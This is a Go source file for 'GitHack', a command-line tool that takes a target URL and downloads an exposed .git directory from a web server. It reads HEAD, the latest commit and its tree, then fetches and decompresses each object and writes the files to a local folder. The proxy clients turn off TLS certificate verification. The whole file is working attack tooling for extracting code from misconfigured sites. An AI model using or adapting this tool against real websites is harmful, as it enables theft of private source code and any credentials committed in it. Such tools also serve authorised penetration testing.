package main

import (
	"bytes"
	"compress/zlib"
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/0x414a/GitHack/GitHackcommon"
	"github.com/0x414a/GitHack/git"
	"github.com/0x414a/GitHack/git/object"
	"golang.org/x/net/proxy"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

var (
	targetUrl = flag.String("u", "", "The target URL to scan")
	proxyUrl  = flag.String("p", "", "Proxy URL (http://127.0.0.1:7890 or socks5://127.0.0.1:7890)")
)

func main() {
	flag.Parse() // 解析命令行参数
	if *targetUrl == "" {
		fmt.Println("Usage: GitHack -u <URL>")
		return
	}
	if !strings.HasSuffix(*targetUrl, "/") {
		*targetUrl += "/"
	}
	if !strings.HasSuffix(*targetUrl, "/.git/") {
		*targetUrl += ".git/"
	}

	GitHackcommon.Client, _ = createClient(*proxyUrl)

	f := git.NewFetcher(*targetUrl)

	head, _ := f.FetchHead()

	if len(f.FetchObject(f.FetchRef(head))) != 0 {
		latestCommit := object.NewObject(f.FetchObject(f.FetchRef(head))).(object.CommitObject)
		latestTree := object.NewObject(f.FetchObject(latestCommit.Tree())).(object.TreeObject)
		// 使用正则表达式匹配名称和哈希
		re := regexp.MustCompile(`Name: (\S+)\nHash: (\S+)`)
		matches := re.FindAllStringSubmatch(latestTree.String(), -1)

		// 创建映射存储名称到哈希的映射
		nameToHash := make(map[string]string)
		for _, match := range matches {
			if len(match) == 3 {
				nameToHash[match[1]] = match[2]
				fmt.Println(`[+] ` + match[1])
			}
		}

		// 最大并发数
		maxGoroutines := 3
		// 用于控制并发数的通道
		guard := make(chan struct{}, maxGoroutines)

		var wg sync.WaitGroup // 用于等待所有协程完成

		for fileName, hash := range nameToHash {
			wg.Add(1)           // 增加WaitGroup的计数
			guard <- struct{}{} // 尝试向guard发送数据，如果通道已满，则阻塞

			// 启动协程
			go func(fileName, hash string) {
				defer wg.Done()            // 协程完成时调用Done减少WaitGroup的计数
				defer func() { <-guard }() // 释放一个位置给其他协程
				recoverObject(fileName, hash, *targetUrl)
			}(fileName, hash)
		}

		wg.Wait()    // 等待所有协程完成
		close(guard) // 关闭通道

		fmt.Println("[End]")
	} else {
		fmt.Println("No found .git")
	}

}

func createClient(proxyUrl string) (*http.Client, error) {
	if proxyUrl == "" {
		return http.DefaultClient, nil
	}
	proxyURI, err := url.Parse(proxyUrl)
	if err != nil {
		return nil, err
	}
	if proxyURI.Scheme == "http" || proxyURI.Scheme == "https" {
		return &http.Client{
			Transport: &http.Transport{
				Proxy:           http.ProxyURL(proxyURI),
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 跳过证书验证
			},
			Timeout: 15 * time.Second,
		}, nil
	} else if proxyURI.Scheme == "socks5" {
		dialer, err := proxy.SOCKS5("tcp", proxyURI.Host, nil, proxy.Direct)
		if err != nil {
			return nil, err
		}
		return &http.Client{
			Transport: &http.Transport{
				Dial:            dialer.Dial,
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 跳过证书验证
			},
			Timeout: 15 * time.Second,
		}, nil
	} else {
		return nil, fmt.Errorf("unsupported proxy scheme")
	}
}

func downloadObject(url string, client *http.Client) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", GitHackcommon.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("bad status: %s", resp.Status)
	}

	return ioutil.ReadAll(resp.Body)
}

func decompressData(data []byte) ([]byte, error) {
	r, err := zlib.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer r.Close()

	var out bytes.Buffer
	if _, err := io.Copy(&out, r); err != nil {
		return nil, err
	}

	return out.Bytes(), nil
}

func recoverObject(fileName, hash, baseURL string) error {
	url := fmt.Sprintf("%s/objects/%s/%s", baseURL, hash[:2], hash[2:])

	recoverTime := time.Now().Format("2006-01-02 15-04-05")

	data, err := downloadObject(url, GitHackcommon.Client)
	if err != nil {
		return fmt.Errorf("downloading object %s failed: %w", hash, err)
	}

	decompressedData, err := decompressData(data)
	if err != nil {
		return fmt.Errorf("decompressing object %s failed: %w", hash, err)
	}

	// 去除对象头（"blob <size>\x00"）
	headerEndIndex := bytes.IndexByte(decompressedData, 0)
	if headerEndIndex == -1 {
		return fmt.Errorf("invalid object format for %s", hash)
	}
	actualContent := decompressedData[headerEndIndex+1:]
	outputPath := path.Join(filepath.Join("recovered_files", strings.Split(strings.TrimSuffix(strings.Split(baseURL, "://")[1], "/.git/"), ":")[0], recoverTime), fileName)

	if err := os.MkdirAll(path.Dir(outputPath), 0755); err != nil {
		fmt.Println(fmt.Errorf("creating directory for object %s failed: %w", hash, err))
		return nil
	}
	if err := ioutil.WriteFile(outputPath, actualContent, 0644); err != nil {
		fmt.Println(fmt.Errorf("writing object %s failed: %w", hash, err))
		return nil
	}
	fmt.Println(`[OK] ` + fileName)
	return nil
}
